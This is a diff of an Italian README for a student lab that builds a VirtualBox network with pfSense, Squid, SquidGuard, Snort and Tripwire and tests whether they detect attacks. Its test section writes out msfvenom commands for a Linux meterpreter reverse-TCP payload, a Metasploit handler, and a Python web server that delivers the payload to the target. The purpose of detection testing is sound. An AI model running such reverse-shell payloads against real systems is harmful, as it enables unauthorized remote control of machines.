@@ -10,81 +10,98 @@ Le macchine virtuali sono le seguenti:
  - **Attacker**: Kali 2023.1 (con installato *python3*)
  - **Firewall**: Pfsense 2.6.0 (con i pacchetti *Squid* e *Snort*)
 
-Per quest'attività è stata configurata una rete interna a VirtualBox: `192.168.56.0 /24` separata da quella domestica: `192.168.1.0 /24`.
-Per fare ciò sono state configurate inizialmente le schede di rete virtuali delle macchine, queste in sostanza implementano un dispositivo fisico emulato dal software. La configurazione è la seguente: 
+Per quest'attività è stata configurata una rete interna a VirtualBox: `172.16.0.0 / 24` separata da quella domestica: `192.168.1.0 / 24`.
+Per fare ciò sono state configurate inizialmente le schede di rete virtuali delle macchine, "implementano" dispositivi fisici emulati dal virtualizzatore. La configurazione è la seguente: 
 
- - **Target**: una scheda di rete connessa alla rete interna (con alias "*intnet*")
- - **Kali**: una scheda di rete connessa alla rete interna (con alias "*intnet*")
- - **Pfsense**: una scheda di rete connessa alla rete interna (con alias "*intnet*"); un'altra in modalità bridge (questa creerà un virtual switch che ci permetterà di uscire dalla"*intnet*" passando per il router domestico)
+ - **Target**: una scheda di rete in modalità *rete interna* (con alias "*intnet*")
+ - **Kali**: una scheda di rete in modalità *bridge*
+ - **Pfsense**: una scheda di rete in modalità *rete interna* (con alias "*intnet*"); un'altra in modalità *bridge* 
+ 
+ Gli adattatori di VirtualBox in modalità *bridge* essenzialmente permettono di porre le macchine virutali allo stesso livello di rete delle macchine nella rete domestica. Dall'altra parte la modalità *rete interna* crea una sottorete con uno spazio di indirizzamento differente.
 
-Successivamente sono state assegnati staticamente gli indirizzi IPv4 alle interfacce come segue:
-|VM  |IPv4 | Subnet Mask | Gateway |
+Gli indirizzi IPv4 delle interfacce sono stati assegnati automaticamente da VirtualBox, ad eccezione di quelli appartenenti alla rete virtuale interna che sono stati configurati tramite il server DHCP di Pfsense (come verrrà illustrato). L'indirizzamento è riportato nella tabella sottostante.
+|VM  |IPv4 |Gateway |
 |--|--|--|--|
-| `Kali` | `192.168.56.101` | `255.255.255.0` | `192.168.56.100`
-| `Ubuntu`| `192.168.56.2`  | `255.255.255.0` | `192.168.56.100`
-| `Pfsense`| `192.168.56.100` | `255.255.255.0` | -
+| `Kali` | `192.168.1.23` |  `192.168.1.1`
+| `Ubuntu`| `172.16.0.50`  |  `172.16.0.1`
+| `Pfsense`| WAN: `192.168.1.21`; LAN: `172.16.0.1` |  `192.168.1.1`
  
 Facendo ciò è stata implementata una rete fedele all'architettura mostrata sopra. 
-Di seguito verranno esplicitati tutti i passi di configurazione e simulazione di due diversi scenari: uno per testare tripwire e un'altro per testare il firewall (con i suoi pacchetti)
-> Nota: nel repository si trovano le macchine con questa configurazione
-# Scenario 1 
-Il primo scenario ha l'obiettivo di testare Tripwire, sottoponendo la macchina `Ubuntu` ad un attacco di *reverse shell TCP* da parte della macchina `Kali`.
-## Kali Attacker
-Per effettuare l'attacco la macchina `Kali` necessita di avere installato python3. 
-```bash
-sudo  apt update &&  sudo  apt upgrade -y
-```
-```bash
-sudo apt install python3
-```
-Fatto ciò si può procedere all'attacco avvalendosi del framework *Metasploit*. Aprire 4 terminali:
+Di seguito verranno esplicitati tutti i passi di configurazione degli strumenti e per la simulazione di scenari di attacco
+> Nota: gli indirizzi di Kali e dell'interfaccia WAN di Pfsense essendo attribuiti in modo dinamico dal router domestico potrebbero variare ad ogni avvio delle macchine.
 
-**1° Terminale**: Ottenere indirizzo ip dell'interfaccia di rete della macchina `Kali`:
- ```bash
-ifconfig
-```
+## Configurazione
+Il primo componente inserito all'interno della reta è Pfsense, una distribuzione firewall open-source basata sul sistema operativo FreeBSD. Una volta avviata e configurata la macchina (opzioni di default), il primo step da affrontare è quello di impostare un nuovo indirizzo IP all'interfaccia di rete LAN (la rete virtuale interna). Per impostarlo basterà attivare il menù `2) Set interface(s) IP address` e successivamente selezionare l'interfaccia LAN (nel caso in questione la numero `2`).  Una volta configurato l'indirizzo IPv4 dell'interfaccia come `172.16.0.1/24` è stato abilitato anche il server DHCP con il seguente range di indirizzi: `172.16.0.50 - 172.16.0.52` (questo operazione eviterà successivamente di impostare manualmente l'indirizzo della macchina `Ubuntu`). 
+
+![pfsensemenu](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Pfsense%20menu.png)
+
+Dalla macchina  `Ubuntu` attraverso un qualsiasi web browser sarà possibile accedere alla GUI per la configurazione di Pfsense (`http://172.16.0.1`) inserendo le credenziali di default: 
+
+ 1. **Username**: *admin*
+ 2. **Password**: *pfsense*
  
- **2° Terminale**: Creare il pacchetto malevolo (eseguibile):
-```bash
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f elf -o Desktop/payloads/shell-x86.elf
-```
-Dove i parametri:
+  ### 1. Regole di NAT su Pfsense
+----------
+ Una volta finita la configurazione iniziale è stato necessario rendere visibile la macchina `Ubuntu` da `Kali`. Essendo su due segmenti di rete differenti è stato necessario creare un *VirtualIP* da mappare con l'indirizzo di `Ubuntu`.  Nello specifico:
+ 
+ 1. dal menù **Firewall > VirtualIP**: aggiungere un nuovo VirtualIP di tipo Alias: `192.168.1.51/32`
+ 2. dal menù ****Firewall > NAT** , scheda **1:1****: aggiungere un nuovo mapping sull'interfaccia WAN tra l'host esterno `192.168.1.51/32` e quello interno `172.16.0.50`
 
--   _msfvenom_: il nome del programma principale metasploit;
--   _-p_: il payload da inserire. Può essere uno scritto da noi o, più comodamente, uno già presente in Metasploit (come in questo caso);
--   _LHOST_: l'indirizzo IP al quale l'app infettata si connetterà. Può essere un indirizzo locale come un indirizzo esterno;
--   _LPORT_: la porta da utilizzare;
--  _-f_: formato del pacchetto;
--   _-o_: il percorso dove andremo a salvare l'applicazione ricompilata, contenente il payload;
+Con questa configurazione ogni volta che `Kali` effettuerà ad esempio un operazione di `ping`verso l'IP `192.168.1.51` verrà ridiretta  da Pfsense  verso l'IP interno `172.16.0.50`.
 
- **3° Terminale**: Ora tramite metaspoilt avvieremo l'*handler* che attenderà l'instaurazione di una *Meterpeter session* verso il `target`
-```bash
-msfconsle
-```
-Una volta aperta la console:
-```bash
-msf6> use multi/handler
-msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 192.168.56.101
-msf6 exploit(multi/handler) > set LPORT 4444
-msf6 exploit(multi/handler) > exploit
+  ### 2. Regole del Firewall su Pfsense
+  ----------
+  Nonostante l'operazione precedente la comunicazione tra  `Kali` e `Ubuntu` viene impedita da una regola di default del Firewall che blocca le comunicazioni con indirizzi **RFC 1918** (quindi anche la famiglia `192.168.0.0  –  192.168.255.255`) . Questa può essere disabilitata dal menù **Firewall > Rules** premendo sull'ingranaggio e deselezionando la voce alla fine del menù in cui si è ridiretti.
+  
+  ![pfsensemenu](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/block%rule.png)
 
-[*] Started reverse handler on 192.168.56.101:4444
-[*] Starting the payload handler...
-```
-Una volta che la vittima avrà installato ed eseguito il file *.elf*  verrà aperta una sessione con una reverse shell che permetterà alla macchina `Kali` di infettare il `target`. Come esempio è stato eseguito un cambio di permessi ad una cartella:
- ```bash
-meterpreter > sudo chmod o+x ./Target
-```
+Infine sono state aggiunte due regole per far passare il traffico da `Kali` verso `Pfsense` e `Ubuntu` 
 
- **4° Terminale**: Per far ricevere il pacchetto alla macchina target viene esposto un web server al quale sarà possibile scaricare il file *shell-x86.elf*. (prima entrare nella cartella in cui è il file):
-```bash
-cd Desktop/payloads
-sudo python -m http.server 80
-```
+(mettere immagine)
 
-## Ubuntu Target
-Nella macchina `target` la prima cosa da fare è installare Tripwire che ci permetterà di rilevare l'attacco compiuto dall'attaccante:
+### 3. Squid e SquidGuard su Pfsense
+  ----------
+ Dal **Package Manager** di `Pfsense` sono stati installati i pacchetti `squid` , `squidGuard`. Entrambi sono stati usati con la funzione di filtrare il traffico *HTTP* della macchina `Ubuntu`.  Dal menù  **Services > Squid Proxy Server** è possibile abilitare il servizio e configurarlo. La configurazione adottata è la seguente:
+ 
+
+ - **Interface**: LAN
+ - **Proxy Port**: 3128
+ - **Transparent Mode**: off (non abilitata solo ai fini di visualizzare una pagina di errore in modalità `int error page`)
+
+ > Nota 1: le voci non elencate sono state lasciate con le opzioni di default
+ 
+ > Nota 2: Essendo la Transparent Mode disabilitata è necessario andare sulle impostazioni del browser e attivare il server proxy alla porta 3128
+
+Come ultimo passo andare su **Services > SquidGuard Proxy Filter**:
+
+ - scheda **Target Categories**: è stata creata una categoria si siti da bloccare denominata `Siti Bloccati` nella quale è stato inserito il dominio `facebook.com`; bloccandone l'accesso e impostando come *Redirect mode* `int error page` (con annesso messaggio di errore) .
+ - scheda **General Settings**: oltre ad abilitare il servizio,
+   selezionare anche l'opzione *Blacklist* inserendo il seguente URL:
+   `https://dsi.ut-capitole.fr/blacklists/download/blacklists_for_pfsense.tar.gz`.
+ - scheda **Blacklist**: attraverso il link precedente sarà
+   possibile scaricare un'elenco di siti categorizzati per filtrare
+   determinate categorie di siti web (come verrà illustrato in seguito).
+ - scheda **Common ACL**:  è possibile estendere la `Target Rule List` da cui è stato bloccato l'accesso ai siti di apparteneti alla categoria `webmail` e alla categoria `Siti bloccati` creata precedentemente (l'opzione di *Redirect Mode* è la medesima). Per la categoria *Default Access [all]* ossia per tutti gli altri siti è stato concesso il permesso.
+
+Una volta salvate e applicate le regole i due servizi "gireranno" all'unisono e nella sezione dei **Test** verranno illustrati i risutati
+
+  
+### 4. Snort su Pfsense
+  ----------
+  Dal menù **Services > Snort** nella scheda **General Settings** sono stati abilitati tutti i repository (nelle rispettive versioni gratuite) dai quali attingere le regole per rilevare possibili attacchi (disabilitando l'opzione per il blocco degli host malevoli); fatto ciò sono state scaricare le regole dalla scheda **Updates** attraverso il bottone *Update rules*.
+
+(foto dei repository)
+
+Dalla scheda **Snort Interfaces** è stato aggiunta l'interfaccia su cui Snort effettuerà il rilevamento ossia la WAN di Pfsense.  Successivamente nella scheda **WAN Categories**
+sono state applicate tutte le regole per il rilevamento scaricate in precedenza.
+
+(vedere questione IPS e apply in WAN rules)
+
+Come ultimo passo è stato avviato Snort sull'interfaccia sempre dalla scheda **Snort Interfaces**.
+  
+### 5. Tripwire su Ubuntu
+  ----------
+  Nella macchina `target` la prima cosa da fare è installare Tripwire che ci permetterà di rilevare l'attacco compiuto dall'attaccante:
 ```bash
 sudo apt-get update
 sudo apt-get install tripwire
@@ -97,7 +114,7 @@ Lasciando inalterate le impostazioni di default, Tripwire ti chiederà di creare
 
 >  Nota: assicurati di scegliere passphrase non facilmente deducibili
 
- ### 1. Inizializzare il database 
+ ###  Inizializzare il database 
 ----------
 
 Il primo step è inizializzare il database che tripwire utilizzerà per convalidare il sistema. Questo utilizza il file delle policy e controlla i punti specificati all'interno. Poiché il file di default non è stato ancora personalizzato per il nostro sistema, avremo molti avvisi, falsi positivi ed errori. Per inizializzare il database eseguire:
@@ -109,7 +126,7 @@ sudo tripwire --init
 Questo creerà il nostro file di database e genererà dei *warnings* che dobbiamo regolare nella configurazione.  Eseguire il comando `check` e posizionare l'output in un file chiamato `test_results` contenuto nella nostra directory di configurazione di tripwire (`etc/tripwire`):
 
 ```bash
-cd /etc/tripwire
+cd etc/tripwire
 sudo sh -c 'tripwire --check | grep Filename > test_results'
 ```
 
@@ -125,7 +142,7 @@ Filename: /root/Mail
 Filename: /root/.xsession-errors
 . . .
 ```
- ### 2. Configurazione file delle policy 
+ ###  Configurazione file delle policy 
 ----------
 
 Ottenuto questo elenco si deve esaminare il file di policy e modificarlo per eliminare questi falsi positivi. Aprire il file *twpol.txt* nell' editor con i privilegi di root:
@@ -162,9 +179,61 @@ The database was successfully generated.
 
 > Nota: se i *warings* persistono rieseguire la procedura con i file indicati  
 
- ### 3. Predisposizione all'attacco
-----------
-Per far si che la macchina `target` subisca l'attacco è necessario scaricare l'eseguibile esposto dalla macchina `Kali` attraverso il web server. Dunque, collegandosi all'indirizzo `192.128.56.101` tramite un qualsiasi browser è possibile scaricare il file ed eseguirlo tramite i seguenti comandi: 
+## Test Tripwire
+Per effettuare l'attacco la macchina `Kali` necessita di avere installato python3. 
+```bash
+sudo  apt update &&  sudo  apt upgrade -y
+```
+```bash
+sudo apt install python3
+```
+Fatto ciò si può procedere all'attacco avvalendosi del framework *Metasploit*. Aprire 4 terminali:
+
+**1° Terminale**: Ottenere indirizzo ip dell'interfaccia di rete della macchina `Kali`:
+ ```bash
+ifconfig
+```
+ 
+ **2° Terminale**: Creare il pacchetto malevolo (eseguibile):
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f elf -o Desktop/payloads/shell-x86.elf
+```
+Dove i parametri:
+
+-   _msfvenom_: il nome del programma principale metasploit;
+-   _-p_: il payload da inserire. Può essere uno scritto da noi o, più comodamente, uno già presente in Metasploit (come in questo caso);
+-   _LHOST_: l'indirizzo IP al quale l'app infettata si connetterà. Può essere un indirizzo locale come un indirizzo esterno;
+-   _LPORT_: la porta da utilizzare;
+-  _-f_: formato del pacchetto;
+-   _-o_: il percorso dove andremo a salvare l'applicazione ricompilata, contenente il payload;
+
+ **3° Terminale**: Ora tramite metaspoilt avvieremo l'*handler* che attenderà l'instaurazione di una *Meterpeter session* verso il `target`
+```bash
+msfconsle
+```
+Una volta aperta la console:
+```bash
+msf6 > use multi/handler
+msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.1.23
+msf6 exploit(multi/handler) > set LPORT 4444
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse handler on 192.168.1.23:4444
+[*] Starting the payload handler...
+```
+Una volta che la macchina `Ubuntu` avrà scaricato ed eseguito il file *.elf*  verrà aperta una sessione con una reverse shell che permetterà alla macchina `Kali` di compiere l'attacci. Come esempio è stato eseguito un cambio di permessi ad una cartella:
+ ```bash
+meterpreter > chmod o+x ./Target
+```
+
+ **4° Terminale**: Per far ricevere il pacchetto alla macchina `Ubuntu` viene esposto un web server al quale sarà possibile scaricare il file *shell-x86.elf*:
+```bash
+cd Desktop/payloads
+sudo python -m http.server 80
+```
+---
+Per far si che la macchina `target` subisca l'attacco è necessario scaricare l'eseguibile esposto dalla macchina `Kali` attraverso il web server. Dunque, collegandosi all'indirizzo `192.128.1.23` tramite un qualsiasi browser è possibile scaricare il file ed eseguirlo tramite i seguenti comandi: 
 ```bash
 sudo chmod +x ./shell-x86.elf ##Concediamo diritti per esecuzione
 ./shell-x86.elf ##Esecuzione
@@ -177,25 +246,30 @@ sudo tripwire --check
 
 ![report](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Tripwire%20detect.png)
 
-# Scenario 2
-Il primo scenario ha l'obiettivo di testare Pfsense, più esplicitamente: 
+## Test Squid
 
- - i pacchetti `squid` , `squidGuard` e `snort`
- - le regole del firewall
-
-## Pfsense 
-L'ultimo componente da inserire all'interno della reta sarà Pfsense, un distribuzione firewall open-source basata sul sistema operativo FreeBSD.Per creare l'istanza della macchina scaricare il file ISO al seguente link https://www.pfsense.org/download/. Una avviata e configurata la macchina (opzioni di default), il primo step da affrontare è quello di impostare un nuovo indirizzo IP all'interfaccia di rete LAN. In generale, l'indirizzo che viene attribuito può essere quello del router domestico (es: 192.168.1.1) o potrebbe non essere impostato. Dunque per impostarne uno manualmente (es: 192.168.56.100) basterà attivare il menù dedicato tramite il tasto `2`
-
-![pfsensemenu](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Pfsense%20menu.png)
+Per verificare il corretto funzionamento del proxy `Squid` basta accedere in *http*
+ ad uno dei siti appartenenti alle categorie bloccate. Nel caso in questione è stato provato l'accesso ai seguenti siti: 
+ 
+ - http://www.gmail.com 
+ - http://www.facebook.com
 
  
-  ### 1. Configurazione 
-----------
-Dalla macchina  `Ubuntu` attraverso un qualsiasi web browser sarà possibile accedere alla GUI per la configurazione di Pfsense (`http://192.168.58.100`) inserendo le credenziali di default: 
+In entrambi i casi Squid ha correttamente impedito l'accesso restituendo le seguenti pagine web. 
 
- - **Username**: *admin*
- - **Password**: *pfsense*
+![squid block](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/squid%20block.png)
 
+![squid block 2](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/squid%20block%202.png)
+
+## Test Snort
+Dalla macchina `Kali` è stato lanciato il seguente comando: 
+
+![nmap](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/nmap.png)
+
+il quale è stato correttamente rilevato da Pfsense. 
+
+![snort log](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/snort%20log.png)
+ 
 ## Autori
 
 - [Mattia Scuriatti](https://github.com/Me77y99)
